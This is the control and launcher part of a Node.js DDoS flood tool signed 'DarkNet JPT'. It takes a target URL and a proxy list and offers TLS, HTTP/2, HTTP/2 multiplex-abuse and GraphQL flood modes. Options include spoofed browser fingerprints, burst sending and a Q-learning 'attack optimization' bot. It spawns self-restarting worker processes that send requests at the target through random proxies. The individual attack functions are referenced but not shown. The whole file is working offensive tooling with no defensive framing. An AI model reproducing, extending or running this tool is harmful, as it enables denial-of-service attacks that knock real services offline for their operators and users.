if (cluster.isMaster) {
    if (process.argv.length < 5) {
        console.log('Usage:');
        console.log('For TLS mode: node ex.cjs tls <host> <proxies> <duration> <rate> <threads> [options]');
        console.log('For HTTP/2 mode: node ex.cjs http2 <host> <proxies> <duration> <rate> <threads> [options]');
        console.log('For HTTP/2 Multiplex Abuse: node ex.cjs h2multi <host> <proxies> <duration> <rate> <threads> [options]');
        console.log('For GraphQL/API Flood: node ex.cjs Grflood <host> <proxies> <duration> <rate> <threads> [options]');
        console.log('For Auto mode: node ex.cjs auto <host> <proxies> <duration> [options]');
        console.log('For Bot Auto mode: node ex.cjs <host> <proxies> <duration> --botauto [options]');
        console.log('Options:');
        console.log('  --bot                Enable bot mode with manual parameters');
        console.log('  --botauto            Enable fully automated bot mode');
        console.log('  --autorate           Enable adaptive rate adjustment');
        console.log('  --maxhpack           Maximize HPACK performance');
        console.log('  --weakhpack          Optimize HPACK for low resource usage');
        console.log('  --maxbrowser         Maximize browser simulation');
        console.log('  --weakbrowser        Basic browser simulation');
        console.log('  --maxtls             Maximize TLS connections');
        console.log('  --weaktls            Optimize TLS for low resource usage');
        console.log('  --maxhttp2           Maximize HTTP/2 streams');
        console.log('  --weakhttp2          Optimize HTTP/2 for low resource usage');
        console.log('  --maxadapt           Maximize adaptive strategy with Q-learning');
        console.log('  --weakadapt          Basic adaptive rate adjustment');
        console.log('  --maxerror           Maximize error retry attempts');
        console.log('  --weakerror          Basic error handling');
        console.log('  --maxconfig          Maximize thread and rate configuration');
        console.log('  --weakconfig         Optimize configuration for low resource usage');
        console.log('  --maxpost            Maximize POST data size');
        console.log('  --weakpost           Minimize POST data size');
        console.log('  --fingerprint=<type> Browser fingerprint (desktop, mobile, tablet, random) [default: random]');
        console.log('  --burst=<count>      Send burst of <count> requests');
        console.log('  --simulate-flow      Simulate browser resource fetching flow');
        console.log('  --compression=<type> Compression type (gzip, deflate, br, zstd) [default: gzip]');
        console.log('  --connection-limit=<num> Max concurrent TLS connections [default: 10]');
        console.log('  --maxconns=<num>     Max TLS connections [default: 50]');
        console.log('  --maxconnsT          Auto-adjust max TLS connections based on system resources');
        console.log('  --learn-strategy     Enable Q-learning for attack optimization');
        console.log('  --config=<file>      Load configuration from JSON file');
        console.log('  --cookie=<value>     Custom cookie string');
        console.log('  --postdata=<value>   POST data string');
        console.log('  --randomstring=<value> Random query string parameter');
        console.log('  --headerdata=<value> Custom header string (format: key=value#key=value)');
        process.exit(0);
    }

    const mode = process.argv[2].toLowerCase();
    const target = mode === 'auto' || process.argv.includes('--botauto') ? process.argv[2] : process.argv[3];
    const proxyfile = mode === 'auto' || process.argv.includes('--botauto') ? process.argv[3] : process.argv[4];
    const time = parseInt(mode === 'auto' || process.argv.includes('--botauto') ? process.argv[4] : process.argv[5]) || 60;
    const rate = parseInt(mode === 'auto' ? 100 : process.argv[6]) || 100;
    const threads = parseInt(mode === 'auto' ? os.cpus().length : process.argv[7]) || os.cpus().length;

    const options = {
        autorate: process.argv.includes('--autorate'),
        bot: process.argv.includes('--bot'),
        botauto: process.argv.includes('--botauto'),
        maxhpack: process.argv.includes('--maxhpack'),
        weakhpack: process.argv.includes('--weakhpack'),
        maxbrowser: process.argv.includes('--maxbrowser'),
        weakbrowser: process.argv.includes('--weakbrowser'),
        maxtls: process.argv.includes('--maxtls'),
        weaktls: process.argv.includes('--weaktls'),
        maxhttp2: process.argv.includes('--maxhttp2'),
        weakhttp2: process.argv.includes('--weakhttp2'),
        maxadapt: process.argv.includes('--maxadapt'),
        weakadapt: process.argv.includes('--weakadapt'),
        maxerror: process.argv.includes('--maxerror'),
        weakerror: process.argv.includes('--weakerror'),
        maxconfig: process.argv.includes('--maxconfig'),
        weakconfig: process.argv.includes('--weakconfig'),
        maxpost: process.argv.includes('--maxpost'),
        weakpost: process.argv.includes('--weakpost'),
        fingerprint: get_option('--fingerprint') || 'random',
        burst: parseInt(get_option('--burst')) || 0,
        simulateFlow: process.argv.includes('--simulate-flow'),
        compression: get_option('--compression') || 'gzip',
        connectionLimit: parseInt(get_option('--connection-limit')) || 10,
        maxConnections: parseInt(get_option('--maxconns')) || (process.argv.includes('--maxconnsT') ? Math.min(Math.max(Math.floor(os.cpus().length * 10 + os.freemem() / (1024 * 1024 * 50)), 10), 200) : 50),
        maxconnsT: process.argv.includes('--maxconnsT'),
        learnStrategy: process.argv.includes('--learn-strategy'),
        config: get_option('--config'),
        query: get_option('--query'),
        hcookie: get_option('--cookie'),
        refererValue: get_option('--referer'),
        postdata: get_option('--postdata'),
        customHeaders: get_option('--headerdata'),
        randomstring: get_option('--randomstring'),
        method: mode === 'auto' || process.argv.includes('--botauto') ? 'GET' : process.argv[2],
        threads: threads,
        rate: rate
    };

    if (options.config) {
        try {
            const config = JSON.parse(fs.readFileSync(options.config, 'utf-8') || '{}');
            Object.assign(options, config);
        } catch (err) {
            console.error(`Error reading or parsing config file '${options.config}': ${err.message}`);
            process.exit(1);
        }
    }

    if (options.maxconfig) {
        options.connectionLimit = os.cpus().length * 10;
        options.rate = Math.floor(50000 / 100);
    } else if (options.weakconfig) {
        options.connectionLimit = Math.floor(os.cpus().length / 2);
        options.rate = Math.min(rate, 50);
    }

    const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(p => p);
    const limit = pLimit(50);
    async function filterValidProxies() {
        const validProxies = await Promise.all(proxies.map(p => limit(() => validateProxy(p).then(valid => valid ? p : null))));
        return validProxies.filter(p => p);
    }

    filterValidProxies().then(validProxies => {
        if (validProxies.length === 0) {
            console.error('No valid proxies found');
            process.exit(1);
        }

        options.proxy = validProxies[Math.floor(Math.random() * validProxies.length)];
        console.log(`Master PID: ${process.pid}`);
        console.log(`Max TLS Connections: ${options.maxConnections}`);
        let workerCount = options.botauto ? Math.min(os.cpus().length, 4) : threads;
        for (let i = 0; i < workerCount; i++) {
            const worker = cluster.fork();
            console.log(`Thread ${i} Started, PID: ${worker.process.pid}`);
        }

        cluster.on('exit', (worker, code, signal) => {
            console.warn(`Worker ${worker.process.pid} died with code ${code}. Restarting...`);
            cluster.fork();
        });

        setTimeout(() => {
            console.log('DarkNet JPT');
            process.exit(1);
        }, time * 1000);
    });
} else {
    const validModes = ['tls', 'http2', 'h2multi', 'Grflood', 'auto'];

    if (process.argv.length < 5) {
        console.error('Insufficient arguments. Check command syntax.');
        console.log('Example: node ex.js <mode> <host> <proxies> <duration> <rate> <threads> [options]');
        process.exit(1);
    }

    const mode = process.argv[2] ? process.argv[2].toLowerCase() : '';
    if (!validModes.includes(mode) && !process.argv.includes('--botauto')) {
        console.error(`Invalid mode: ${mode}. Valid modes: ${validModes.join(', ')} or --botauto`);
        process.exit(1);
    }

    const isBotAuto = process.argv.includes('--botauto');

    const target = (mode === 'auto' || isBotAuto) ? process.argv[2] : process.argv[3];
    const proxyfile = (mode === 'auto' || isBotAuto) ? process.argv[3] : process.argv[4];

    if (!target) {
        console.error('Target URL not provided. Please provide a valid URL.');
        process.exit(1);
    }
    if (!proxyfile) {
        console.error('Proxy file not provided. Please provide a valid proxy file path.');
        process.exit(1);
    }

    const time = Math.max(1, parseInt((mode === 'auto' || isBotAuto) ? process.argv[4] : process.argv[5]) || 60);
    const rate = Math.max(1, parseInt(mode === 'auto' ? 100 : process.argv[6]) || 100);
    const threads = Math.max(1, parseInt(mode === 'auto' ? os.cpus().length : process.argv[7]) || os.cpus().length);

    const options = {
        autorate: process.argv.includes('--autorate'),
        bot: process.argv.includes('--bot'),
        botauto: process.argv.includes('--botauto'),
        maxhpack: process.argv.includes('--maxhpack'),
        weakhpack: process.argv.includes('--weakhpack'),
        maxbrowser: process.argv.includes('--maxbrowser'),
        weakbrowser: process.argv.includes('--weakbrowser'),
        maxtls: process.argv.includes('--maxtls'),
        weaktls: process.argv.includes('--weaktls'),
        maxhttp2: process.argv.includes('--maxhttp2'),
        weakhttp2: process.argv.includes('--weakhttp2'),
        maxadapt: process.argv.includes('--maxadapt'),
        weakadapt: process.argv.includes('--weakadapt'),
        maxerror: process.argv.includes('--maxerror'),
        weakerror: process.argv.includes('--weakerror'),
        maxconfig: process.argv.includes('--maxconfig'),
        weakconfig: process.argv.includes('--weakconfig'),
        maxpost: process.argv.includes('--maxpost'),
        weakpost: process.argv.includes('--weakpost'),
        fingerprint: get_option('--fingerprint') || 'random',
        burst: parseInt(get_option('--burst')) || 0,
        simulateFlow: process.argv.includes('--simulate-flow'),
        compression: get_option('--compression') || 'gzip',
        connectionLimit: parseInt(get_option('--connection-limit')) || 10,
        maxConnections: parseInt(get_option('--maxconns')) || (process.argv.includes('--maxconnsT') ? Math.min(Math.max(Math.floor(os.cpus().length * 10 + os.freemem() / (1024 * 1024 * 50)), 10), 200) : 50),
        maxconnsT: process.argv.includes('--maxconnsT'),
        learnStrategy: process.argv.includes('--learn-strategy'),
        config: get_option('--config'),
        query: get_option('--query'),
        hcookie: get_option('--cookie'),
        refererValue: get_option('--referer'),
        postdata: get_option('--postdata'),
        customHeaders: get_option('--headerdata'),
        randomstring: get_option('--randomstring'),
        method: mode === 'auto' || process.argv.includes('--botauto') ? 'GET' : process.argv[2],
        threads: threads,
        rate: rate
    };

    if (options.config) {
        try {
            const config = JSON.parse(fs.readFileSync(options.config, 'utf-8') || '{}');
            Object.assign(options, config);
        } catch (err) {
            console.error(`Error reading or parsing config file '${options.config}': ${err.message}`);
            process.exit(1);
        }
    }

    const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(p => p);
    async function getValidProxy(proxies) {
        const limit = pLimit(50);
        for (let i = 0; i < proxies.length; i++) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            if (await limit(() => validateProxy(proxy))) {
                return proxy;
            }
        }
        console.error('No valid proxy found');
        process.exit(1);
    }

    getValidProxy(proxies).then(proxy => {
        options.proxy = proxy;
        if (options.bot || options.botauto) {
            const AttackBot = require('./bot.js');
            const bot = new AttackBot(target, options);
            const attackFunctions = {
                tls: tlsAttack,
                http2: http2Attack,
                h2multi: h2multi,
                Grflood: Grflood
            };
            bot.run(attackFunctions[mode] || tlsAttack, getTlsConnection(new URL(target), options.maxConnections));
        } else {
            const attackFn = {
                tls: tlsAttack,
                http2: http2Attack,
                h2multi: h2multi,
                Grflood: Grflood
            }[mode] || tlsAttack;
            if (options.burst) {
                async function sendBurst() {
                    for (let i = 0; i < options.burst; i++) {
                        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                        await attackFn(proxy, target, options.method || 'GET', rate, options);
                    }
                }
                sendBurst().then(() => setInterval(() => {
                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    attackFn(proxy, target, options.method || 'GET', options.autorate ? rate : rate, options);
                }, 1000 / (options.autorate ? rate : rate)));
            } else {
                setInterval(() => {
                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    attackFn(proxy, target, options.method || 'GET', options.autorate ? rate : rate, options);
                }, 1000 / (options.autorate ? rate : rate));
            }
        }

        setTimeout(() => {
            console.log('DarkNet JPT');
            process.exit(1);
        }, time * 1000);
    });
}

process.on('uncaughtException', (err) => console.error(`Uncaught Exception: ${err.message}`));
process.on('unhandledRejection', (err) => console.error(`Unhandled Rejection: ${err.message}`));
process.on('warning', (warn) => console.warn(`Warning: ${warn.message}`));
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

module.exports = { tlsAttack, http2Attack, h2multi, Grflood };